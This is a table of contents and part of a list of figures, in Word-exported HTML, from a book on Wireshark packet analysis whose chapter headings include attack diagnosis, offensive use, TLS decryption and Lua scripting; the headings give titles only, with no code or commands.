<div class="Section2" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:365.4000pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark233" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Summary</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark234" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Exercises</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.6000pt;margin-right:281.4500pt;margin-left:53.0000pt;text-indent:-22.5000pt;line-height:127%;" ><span><a href="#_bookmark236" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4: Capturing Packets</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark239" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Sniffing</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:207.6000pt;margin-left:53.0000pt;line-height:130%;" ><span><a href="#_bookmark259" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Dealing with the Network</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark306" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Loading and Saving Capture Files</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark338" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Dissectors</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:178.7000pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark362" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Viewing Someone Else&#8217;s Captures</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark364" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Summary</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:53.0000pt;line-height:16.9000pt;mso-line-height-rule:exactly;" ><span><a href="#_bookmark365" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Exercises</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:4.8500pt;margin-right:210.6500pt;margin-left:53.0000pt;text-indent:-22.5000pt;line-height:127%;" ><span><a href="#_bookmark367" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 5: Diagnosing Attacks</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark371" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Attack Type: Man-in-the-Middle</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark424" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Attack Type: Denial of Service</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:114.0000pt;margin-left:53.0000pt;line-height:131%;" ><span><a href="#_bookmark437" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Attack Type: Advanced Persistent Threat</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark452" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Summary</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:53.0000pt;line-height:16.3000pt;mso-line-height-rule:exactly;" ><span><a href="#_bookmark453" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Exercises</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:4.5000pt;margin-right:208.8500pt;margin-left:53.0000pt;text-indent:-22.5000pt;line-height:128%;" ><span><a href="#_bookmark454" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 6: Offensive Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark457" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Attack Methodology</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark462" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Reconnaissance Using Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark472" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Evading IPS/IDS</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:53.0000pt;line-height:16.8500pt;mso-line-height-rule:exactly;" ><span><a href="#_bookmark475" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Exploitation</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:4.7000pt;margin-right:240.4500pt;margin-left:53.0000pt;line-height:131%;" ><span><a href="#_bookmark525" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Remote Capture over SSH</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark528" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Summary</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:53.0000pt;line-height:16.3000pt;mso-line-height-rule:exactly;" ><span><a href="#_bookmark530" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Exercises</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:4.7500pt;margin-right:52.5000pt;margin-left:30.5000pt;" ><span><a href="#_bookmark531" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 7: Decrypting TLS, Capturing USB, Keyloggers, and</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Network Graphing</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:4.5500pt;margin-right:281.5500pt;margin-left:53.0000pt;line-height:130%;" ><span><a href="#_bookmark533" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Decrypting SSL/TLS</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark556" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >USB and Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark587" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Graphing the Network</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section3" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:365.4000pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark597" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Summary</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark599" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Exercises</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.6000pt;margin-right:240.4500pt;margin-left:53.0000pt;text-indent:-22.5000pt;line-height:127%;" ><span><a href="#_bookmark600" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 8: Scripting with Lua</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark603" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Why Lua?</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:324.8500pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark606" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Scripting</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.4500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Basics</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark616" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Setup</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:53.0000pt;" ><span><a href="#_bookmark623" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Tools</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:4.7000pt;margin-right:178.7000pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark640" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Creating Dissectors for Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark660" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Extending Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:53.0000pt;line-height:16.9000pt;mso-line-height-rule:exactly;" ><span><a href="#_bookmark672" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Summary</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:5.4500pt;margin-left:30.5000pt;" ><span><a href="#_bookmark681" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >End User License Agreement</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:16.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >List of Illustrations</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 1: Introducing Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:172.0500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark21" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-1: The Wireshark home</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.1000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >screen</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark24" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-2: The Packet List pane</span></u></a></span><span><a href="#_bookmark27" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 1-3: The Packet Details</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.6000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >pane</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:114.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark40" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-4: Field information in the status bar</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark43" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-5: ARP packet Opcode</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:52.5000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark48" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-6: Filter results of ARP from a source address</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark51" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-7: Complex display filter example</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 2: Setting Up the Lab</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:52.5000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark68" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-1: Getting SHA-256 file hash in PowerShell</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark71" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-2: VirtualBox SHA-256 checksums</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:145.3500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark74" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-3: VirtualBox installation window</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark76" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-4: VirtualBox feature selection</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark79" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-5: VirtualBox shortcut creation</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section4" ><p class=MsoBodyText  align=justify  style="margin-top:3.7500pt;margin-right:144.7000pt;margin-left:53.0000pt;text-align:justify;text-justify:inter-ideograph;line-height:145%;" ><span><a href="#_bookmark81" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-6: VirtualBox networking</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.3000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >warning</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark84" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-7: VirtualBox installation window</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark86" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-8: VirtualBox installation</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.7500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >status</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:90.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark89" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-9: VirtualBox driver installation prompt</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark91" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-10: VirtualBox installation &nbsp;finished</span></u></a></span><span><a href="#_bookmark94" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 2-11: VirtualBox GUI and restart window</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark96" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-12: VirtualBox Extension Pack download</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark99" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-13: VirtualBox Extension Pack</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.6500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >preferences</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark102" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-14: VirtualBox Extension Pack</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.4000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >installation</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark104" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-15: Successful VirtualBox Extension Pack installation</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark106" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-16: Kali download web page</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:114.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark110" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-17: Creating a new virtual machine</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark113" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-18: Selecting virtual machine memory</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark115" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-19: Creating virtual disk</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:145.3500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark118" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-20: Selecting virtual disk type</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark120" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" 